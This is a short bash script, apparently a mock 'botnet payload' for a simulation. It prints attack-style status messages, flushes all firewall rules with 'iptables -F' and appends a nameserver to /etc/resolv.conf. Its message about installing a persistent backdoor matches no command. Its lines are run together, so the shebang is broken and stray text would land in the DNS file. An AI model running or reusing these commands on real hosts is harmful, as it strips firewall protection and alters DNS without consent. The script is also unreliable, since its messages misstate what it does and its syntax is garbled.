#!/bin/bash echo 
"[*] Fake Botnet Payload Executed" 
echo "[*] Disabling firewall..." 
iptables -F 
echo "[*] Installing persistent backdoor..." 
echo "nameserver 1.1.1.1" >> /etc/resolv.conf echo "[*] Payload complete."
